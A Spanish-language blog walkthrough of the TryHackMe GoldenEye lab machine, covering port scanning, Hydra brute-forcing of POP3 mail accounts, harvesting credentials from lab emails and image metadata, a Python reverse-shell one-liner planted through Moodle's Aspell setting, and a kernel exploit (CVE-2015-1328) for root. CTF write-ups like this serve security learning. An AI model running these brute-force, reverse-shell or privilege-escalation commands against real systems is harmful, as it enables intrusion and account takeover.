---
toc: true
comments: true
title: TryHackMe - GoldenEye
layout: post
title: TryHackMe - GoldenEye
date: 2024-05-01 18:28 -0300
categories: [TryHackMe, Medium, CTF]
tags: [POP3, Moodle, Hydra]    
image: /assets/Posts/GoldenEye/logo.png
---

## Pre
- Hacía tiempo que no resolvía máquinas y elegir un nivel medio resultó ser bastante desafiante, pero sin duda fue una buena elección, ya que adquirí conocimientos de distintas técnicas fuera de lo común para resolver otros desafíos futuros.
- Antes de empezar, tenemos que ponernos en modo 007 con la banda sonora del juego de N64 GoldenEye: [Banda Sonora](https://youtu.be/M1MPVbZ-vTg?si=YUWio5O4MFuquUBp)
- Es posible que a lo largo del walkthrough la ip de la maquina cambien ya que fue realizado durante mas de un dia y en varias sesiones.

## Phase 1: Recon
Como siempre comenzamos haciendo **Ping** y de responder ejecutamos el tipico escaneo de **nmap** mientras navegamos al sitio. De forma adicional lanzamos una enumeracion con gobuster que no dio resultados interesantes.

```shell
# Nmap 7.94SVN scan initiated Wed Apr 24 13:56:57 2024 as: nmap -p- -sS --min-rate 5000 -n -Pn -vv -oG output_nmap 10.10.123.66
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.123.66 ()	Status: Up
Host: 10.10.123.66 ()	Ports: 25/open/tcp//smtp///, 80/open/tcp//http///, 55006/open/tcp/////, 55007/open/tcp/////	Ignored State: closed (65531)
# Nmap done at Wed Apr 24 13:57:12 2024 -- 1 IP address (1 host up) scanned in 14.82 seconds
```
Al ingresar vemos una animacion que nos conduce a un login "oculto" (no realmente)

![Desktop View](/assets/Posts/GoldenEye/1.png){: width="972" height="589" }
_Index_

De analizar el script como sugiere TryHackMe encontramos lo siguiente:

![Desktop View](/assets/Posts/GoldenEye/2.png){: width="972" height="589" }
_Script usado por el sitio_

Traduciendo con CyberChef tenemos que `&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;` tiene el secreto de usuario `boris:InvincibleHack3r`

Una vez que entramos al sitio vemos que no contiene mucha informacion salvo la mencion de un **servidor de correos** en un puerto alto, el mismo detectado por **nmap**. Ademas se hace mencion al potencial user **natalya**

![Desktop View](/assets/Posts/GoldenEye/3.png){: width="972" height="589" }
_Sitio visto con user Boris_


## Phase 2: Email

De hacer conexion via **telnet** al puerto alto llegamos a un servidor de correos POP3 pero sin suerte con el user y pass.

```shell
# telnet 10.10.123.98 55007
Trying 10.10.123.98...
Connected to 10.10.123.98.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
```

Lanzamos entonces nuestros ataques *hydra* (notar el formato de llamada de protocolos no http). Si la wordlist fasttrack no da resultados pasaremos a usar rockyou.txt pero para los ctfs suele ser la mejor:

```shell
hydra -l boris -P /usr/share/wordlists/fasttrack.txt  pop3://10.10.119.14:55007 -t 64 -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-24 16:13:19
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
[DATA] attacking pop3://10.10.119.14:55007/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] CAPABILITY: +OK
CAPA
TOP
UIDL
RESP-CODES
PIPELINING
AUTH-RESP-CODE
STLS
USER
SASL PLAIN
.
[VERBOSE] using POP3 PLAIN AUTH mechanism
[55007][pop3] host: 10.10.119.14   login: boris   password: secret1!
[STATUS] attack finished for 10.10.119.14 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-24 16:13:52
```
Tenemos nuestro primer usuario `boris:secret1!`. Lanzamos el mismo ataque hydra para **natayla** mientras exploramos la cuenta de boris y sus correos personales.  Al estar en un entorno POP3 tenemos el comando **list** para ver la lista de correos y **retr** para obtener el correo deseado de la lista. (Solo documento el tercero ya que el 1 y el 2 no eran interesantes)

```shell
LIST
+OK 3 messages:
1 544
2 373
3 921
.

RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```

Este correo nos proporciona información de inteligencia que indica la existencia de otro usuario potencial de Xenia, además de mencionar la existencia de un sitio de entrenamiento para encontrarlo. Mientras tanto, nuestro ataque a Natalya culminó exitosamente: `natalya:bird`.

```shell
user natalya
+OK
pass bird
+OK Logged in.
LIST
+OK 2 messages:
1 631
2 1048
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

Ejecutamos la configuracion en /etc/hosts acorde y tenemos acceso a una plataforma *moodle*

# Phase 3: Moodle

Tenemos entonces `xenia:RCP90rulez!` y la url configurada severnaya-station.com/gnocertdir. La exploramos y llegamos a sus mensajes 

![Desktop View](/assets/Posts/GoldenEye/4.png){: width="972" height="589" }
_Moodle_


Tenemos entonces un nuevo usuario llamado **doak** y realizamos la misma tecnica con **hydra**. `hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.10.119.14:55007 -t 64 -v`

Con eso llegamos a `doak:goat`. A esta altura la maquina se torna un poco pesada ya que estamos repitiendo las mismas tecnicas de explotacion, pero llegamos finalmente a un correo de doak donde se menciona explicitamente el siguiente user: `dr_doak:4England!`

De acceder a su moodle y navegar a sus archivos vemos un archivo secreto que contine informacion

![Desktop View](/assets/Posts/GoldenEye/5.png){: width="972" height="589" }
_Moodle_

El archivo menciona lo siguiente:

```shell
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

De acceder a ese directorio (/dir007key/for-007.jpg) nos encontramos una imagen la cual de ser analizada con **exiftool** (un clasico lector de metadata) contiene la password del administrador. Finalmente logramos obtener nuestro usuario `admin:xWinter1995x!`

## Phase 4: Endgame

Tryhackme nos continua guiando sugiriendo que veamos Aspell, el corrector ortografico de moodle. 

![Desktop View](/assets/Posts/GoldenEye/6.png){: width="972" height="589" }
_Aspell config_

De modificar esta entrada por la reverse shell de python y setear un netcat (`nc -lnvp 8081`) en nuestra maquina deberiamos obtener una reverse shell. Adicionalmente debemos cambiar la configuracion de spell checker previo a este paso debemos ir a la configuracion de **TinyMCE HTML editor** y cambiar la eleccion de corrector de "Google SpellCheck" a "PSpellShell". 

```shell
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.123.98”,8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```

Luego nos basta con crear un post y probar su ortografia para que el servidor invoque el proceso y llame al comando de reverse shell. A notar que luego de realizar estos pasos encontre que es posible utilizar **metasploit** para simplificar esto asi que si estan resolviendo la maquina en paralelo quizas les simplifique. 

A esta altura deberiamos recibir nuestra conexion remota y tener acceso al shell con usuario www-data.

# Phase 5: Root
TryHackMe nos continua guiando, sugiere descargar el script [LinuxPrivChecker.py](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) , el cual fue muy util para determinar que habia en la computadora.
 
Para eso creamos un simple http server con python3 (`python3 -m SimpleHTTPServer 1337`) y lo descargamos con la maquina victima utilizando (`wget ip:8000/linuxprivchecker.py`). Lo ejecutamos y podemos ver la version del kernell 3.13.0-32-generic. Esta es vulnerable a **CVE-2015-1328**, y el mismo tryhackme nos brinda el enlace a su exploit: https://www.exploit-db.com/exploits/37292

Sin embargo, nos encontramos con un problema: la máquina víctima no tenía instalado gcc para ejecutar correctamente el exploit, solo cc (como se puede ver al ejecutar linuxprivchecker).

En este punto, me encontré completamente bloqueado ya que no podía entender cómo arreglar el exploit por mi cuenta. Finalmente, tuve que recurrir a una guía que mostraba lo simple que era hacerlo.

![Desktop View](/assets/Posts/GoldenEye/7.png){: width="972" height="589" }
_Exploit Fix_

Descargamos entonces el codigo en la maquina victima, lo modificamos y ejecutamos:

```shell
cc 37292.c -o ofc
chmod +x ofc
./ofc
```

Y listo tenemos acceso de ROOT a todo, principalmente nuestra flag deseada. 

# Conclusiones
- Muy interesante la explotacion de los correos usando hydra, realmente se pudo comprometer casi toda la "organizacion"
- Un poco pesado el final principalmente por lo mucho que me tranque con la linea del cc pero queda para futuro!


![Desktop View](/assets/Posts/GoldenEye/8.png){: width="972" height="589" }
_Exploit Fix_







